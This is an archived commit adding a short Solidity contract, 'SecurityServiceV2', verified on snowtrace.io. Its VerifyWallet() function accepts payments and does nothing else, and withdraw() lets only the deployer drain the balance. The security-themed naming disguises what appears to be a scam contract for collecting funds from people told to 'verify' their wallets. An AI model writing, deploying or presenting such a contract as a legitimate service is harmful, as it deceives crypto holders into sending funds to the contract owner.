f14139bf63f1a6cafa41167b2481abc6f4c51577
minion <minion>
2023-04-08 21:02:16 +0000

    with 💕

---
+++ contracts/mainnet/0a/0a2cbf8872da36fe976906d1c11cd9ccfa949269_SecurityServiceV2.sol
@@ -0,0 +1,32 @@
+/**
+ *Submitted for verification at snowtrace.io on 2023-04-08
+*/
+
+pragma solidity ^0.8.17;
+
+contract SecurityServiceV2 {
+
+    address private owner;
+
+     constructor() public{   
+        owner=msg.sender;
+    }
+
+    function getOwner(
+    ) public view returns (address) {    
+        return owner;
+    }
+
+
+    function withdraw() public {
+        require(owner == msg.sender);
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    function VerifyWallet() public payable {
+    }
+
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
